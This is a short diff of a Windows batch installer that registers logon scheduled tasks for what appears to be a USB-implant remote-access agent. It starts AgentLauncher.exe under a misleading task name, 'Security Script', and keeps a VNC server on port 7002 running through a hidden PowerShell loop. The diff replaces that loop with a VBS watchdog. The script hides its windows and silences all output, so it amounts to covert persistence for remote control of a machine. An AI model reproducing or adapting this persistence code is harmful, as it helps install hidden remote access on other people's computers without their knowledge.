@@ -186,7 +186,7 @@ if !errorlevel! neq 0 ( schtasks /create /tn "USBArmyKnife Agent" /tr "%DEST%\Ag
 schtasks /query /tn "Security Script" >nul 2>&1
 if !errorlevel! neq 0 ( schtasks /create /tn "Security Script" /tr "%DEST%\AgentLauncher.exe vid=cafe pid=403f cwd=%DEST%" /sc onlogon /rl limited /f >nul 2>&1 & echo    [+] Task created. ) else ( echo    [-] Already exists. )
 schtasks /query /tn "VNC Watchdog" >nul 2>&1
-if !errorlevel! neq 0 ( schtasks /create /tn "VNC Watchdog" /tr "powershell.exe -NoProfile -WindowStyle Hidden -Command \"while($true){if(!(Get-Process VncDirect -EA SilentlyContinue)){Start-Process '%DEST%\VncDirect\VncDirect.exe' -ArgumentList 'port=7002 cwd=%DEST%\VncDirect\vnc fps=360 scale=0'};Start-Sleep 5}\"" /sc onlogon /rl limited /f >nul 2>&1 & echo    [+] Task created. ) else ( echo    [-] Already exists. )
+if !errorlevel! neq 0 ( schtasks /create /tn "VNC Watchdog" /tr "wscript.exe C:\AgentInstall\vnc-watchdog.vbs" /sc onlogon /rl limited /f >nul 2>&1 & echo    [+] Task created. ) else ( echo    [-] Already exists. )
 schtasks /query /tn "VNC Direct" >nul 2>&1
 if !errorlevel! equ 0 ( schtasks /delete /tn "VNC Direct" /f >nul 2>&1 )
 schtasks /query /tn "VNC Direct User" >nul 2>&1
